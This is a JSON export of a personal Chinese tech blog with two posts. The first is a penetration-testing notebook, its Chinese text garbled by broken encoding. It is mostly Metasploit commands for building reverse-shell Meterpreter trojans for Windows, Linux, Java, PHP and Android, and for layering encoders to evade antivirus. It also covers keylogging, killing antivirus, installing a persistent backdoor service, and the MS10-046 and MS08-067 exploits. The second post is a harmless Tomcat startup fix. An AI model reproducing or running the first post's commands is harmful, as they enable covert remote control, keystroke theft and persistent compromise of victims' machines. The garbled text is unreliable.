{"meta":{"title":"沟通世界，实现梦想","subtitle":"一个有理想的开发者","description":null,"author":"Rxxy","url":"https://rxxy.github.io"},"pages":[],"posts":[{"title":"kali��͸�ʼ�","slug":"kali渗透笔记","date":"2016-12-26T15:45:39.379Z","updated":"2016-12-26T15:50:05.667Z","comments":true,"path":"2016/12/26/kali渗透笔记/","link":"","permalink":"https://rxxy.github.io/2016/12/26/kali渗透笔记/","excerpt":"","text":"#kali��͸�ʼ�WindowsshellCode usege/root����ľ��hello.exe Lhost����ip Lpost�����˿� windows/meterpreter/reverse_tcp LHOST=192.168.159.128LPORT=1211 X��E>hello.exe12345678910111213msf&gt; use exploit/multi/handlermsfexploit(handler) &gt; set payloadwindows/meterpreter/reverse_tcppayload=&gt; windows/meterpreter/reverse_tcpmsfexploit(handler) &gt; set LHOST 192.168.159.128LHOST=&gt; 192.168.159.128msfexploit(handler) &gt; set LPORT1211LPORT =&gt; 1211msfexploit(handler) &gt; exploit```��ʼ��������Ŀ��������ľ�����ɻ�ȡshell##### linux�¹����غ�```msfpayloadlinux/x86/meterpreter/rverse_tcp LHOST=192.168.159.128 LPORT=1212 X &gt;hello.shmsfexploit(handler) &gt; set payloadlinux/x86/meterpreter/reverse_tcppayload =&gt;linux/x86/meterpreter/reverse_tcp java�¹����غ�java/meterpreter/reverse_tcp LHOST=192.168.159.128 LPORT=1212 X >hello.jar```123##### php�¹����غ�```msfpayloadphp/meterpreter/reverse_tcpLHOST=192.168.159.128LPORT=R&gt;123.php Android�¹����غ�1msfpayloadandroid/meterpreter/reverse_tcp LHOST=192.168.159.LPORT=7777 R&gt; /root/hello.apk shellCode��ɱ���ر�����ɱ(��)��LPORT=R|Msfencode -ex86/shikata_ga_nai -c 5 -t raw | msfencode -e x86/alpha_upper -c 2 -t raw |msfencode -e x86/shikata_ga_nai -c 5 -t raw | msfencode -e x86/countdown -c 5-t exe -o1-o/root/hello.exe �ӿ�Upx-5hello.exe meterpreter�������� screenshot����sysinfoϵͳ��Ϣps�鿴����migrate 1323�л����̣�ʹľ���Ĵ������������ϣ�Run post/windows/capture/keylog_recorder��¼�������� �־ÿ���runpost/windows/manage/migrate�Զ��л�����run killav�ر��������е�cmd��������װ����runmetsvc -A��װ����ʹ�ú��ţ�use exploit/multi/handlersetpayloadwindows/metsvc_bind_tcpset RHOST 192.168.159.1set LPORT 31337exploit ©�����ã�Ms10-046useexploit/windows/browser/ms10_046_shortcut_icon_dllloaderSRVHOSTLHOST����Ϊ����ipPayload��set payload windows/shell/reverse_tcp Ms08-067set payloadwindows/meterpreter/reverse_tcpRHOSTLHOST Targets:0Automatic Targeting 1Windows 2000 Universal 2Windows XP SP0/SP1 Universal 3Windows 2003 SP0 Universal 4Windows XP SP2 English (AlwaysOn NX) 5Windows XP SP2 English (NX) 6Windows XP SP3 English (AlwaysOn NX) 7Windows XP SP3 English (NX) 8Windows XP SP2 Arabic (NX) 9Windows XP SP2 Chinese - Traditional / Taiwan (NX) Windows XP SP2 Chinese - Simplified (NX) Windows XP SP2 Chinese - Traditional (NX) Windows XP SP2 Czech (NX) Windows XP SP2 Danish (NX) Windows XP SP2 German (NX) Windows XP SP2 Greek (NX) Windows XP SP2 Spanish (NX) Windows XP SP2 Finnish (NX) Windows XP SP2 French (NX) Windows XP SP2 Hebrew (NX) Windows XP SP2 Hungarian (NX) Windows XP SP2 Italian (NX) Windows XP SP2 Japanese (NX) Windows XP SP2 Korean (NX) Windows XP SP2 Dutch (NX) Windows XP SP2 Norwegian (NX) Windows XP SP2 Polish (NX) Windows XP SP2 Portuguese - Brazilian (NX) Windows XP SP2 Portuguese (NX) Windows XP SP2 Russian (NX) Windows XP SP2 Swedish (NX) Windows XP SP2 Turkish (NX) Windows XP SP3 Arabic (NX) Windows XP SP3 Chinese - Traditional / Taiwan (NX) Windows XP SP3 Chinese - Simplified (NX) Windows XP SP3 Chinese - Traditional (NX) Windows XP SP3 Czech (NX) Windows XP SP3 Danish (NX) Windows XP SP3 German (NX) Windows XP SP3 Greek (NX) Windows XP SP3 Spanish (NX) Windows XP SP3 Finnish (NX) Windows XP SP3 French (NX) Windows XP SP3 Hebrew (NX) Windows XP SP3 Hungarian (NX) Windows XP SP3 Italian (NX) Windows XP SP3 Japanese (NX) Windows XP SP3 Korean (NX) Windows XP SP3 Dutch (NX) Windows XP SP3 Norwegian (NX) Windows XP SP3 Polish (NX) Windows XP SP3 Portuguese - Brazilian (NX) Windows XP SP3 Portuguese (NX) Windows XP SP3 Russian (NX) Windows XP SP3 Swedish (NX) Windows XP SP3 Turkish (NX) Windows 2003 SP1 English (NO NX) Windows 2003 SP1 English (NX) Windows 2003 SP1 Japanese (NO NX) Windows 2003 SP1 Spanish (NO NX) Windows 2003 SP1 Spanish (NX) Windows 2003 SP2 English (NO NX) Windows 2003 SP2 English (NX) Windows 2003 SP2 German (NO NX) Windows 2003 SP2 German (NX) Windows 2003 SP2 Portuguese - Brazilian (NX) Windows 2003 SP2 Spanish (NO NX) Windows 2003 SP2 Spanish (NX) Windows 2003 SP2 Japanese (NO NX)","categories":[],"tags":[],"keywords":[]},{"title":"Tomcat 启动卡在部署项目时（linux）","slug":"Tomcat 启动卡在部署项目时（linux）","date":"2016-11-14T12:26:58.817Z","updated":"2016-12-26T15:38:57.338Z","comments":true,"path":"2016/11/14/Tomcat 启动卡在部署项目时（linux）/","link":"","permalink":"https://rxxy.github.io/2016/11/14/Tomcat 启动卡在部署项目时（linux）/","excerpt":"","text":"#Tomcat 启动卡在部署项目时（linux） 找到1```securerandom.source=file:/dev/./urandom 这时候根据修改内容就可以查到因为此原因不仅可以造成tomcat卡住，也会造成weblogic启动缓慢，linux或者部分unix系统提供随机数设备是/dev/random和/dev/urandom，两个有区别，urandom安全性没有random高，但random需要时间间隔生成随机数。jdk默认调用random。再后来，终于在weblogic的官方文档中 Monitoring and Troubleshooting 找到了 Avoiding JVM Delays Caused ByRandom Number Generation 这样一个标题。摘录如下： The library used for randomnumber generation in Sun’s JVM relies on /dev/random by default for UNIXplatforms. This can potentially block the Oracle WebLogic CommunicationServices process because on some operating systems /dev/random waits for acertain amount of “noise” to be generated on the host machine beforereturning a result. Although /dev/random is more secure, Oracle recommendsusing /dev/urandom if the default JVM configuration delays Oracle WebLogicCommunication Services startup. To determine if your operatingsystem exhibits this behavior, try displaying a portion of the file from ashell prompt: head -n 1 /dev/randomOpen the$JAVA_HOME/jre/lib/security/java.security file in a text editor. Change the line: securerandom.source=file:/dev/randomto read: securerandom.source=file:/dev/urandomSave your change and exit thetext editor.其中说到：可通过 head -n 1 /devrandom 查看是否你的系统会出现伪随机数提供等待。OK就这个，试了一下，果然，在服务器第一次启动后，这个可以快速提供一个值，但当再次调用时发生等待。 解决办法： 永久：oracle 说修改$JAVA_HOME/jre/lib/security/java.security文件，替换securerandom.source=file:/dev/random为securerandom.source=file:/dev/urandom。对所有使用JVM的应用生效。（这个永久的方法，这里面有个问题，就是设置时候实际应该设置为securerandom.source=file:/dev/./urandom，否则不生效） DOMAIN临时：修改startWeblogic.sh文件，JAVA_OPTIONS=”${SAVE_JAVA_OPTIONS}-Djava.security.egd=file:/dev/./urandom” 后继的SecureRandom 测试学习 编写JAVA类如下，运行测试，第一次正常，第二次等待，重启服务器后第一次又正常。启动加入参数-Djava.security.egd=file:/dev/./urandom 正常 来自[http://blog.csdn.net/njchenyi/article/details/46641141](http://blog.csdn.net/njchenyi/article/details/46641141) 原文地址：http://blog.csdn.net/njchenyi/article/details/46641141","categories":[],"tags":[],"keywords":[]}]}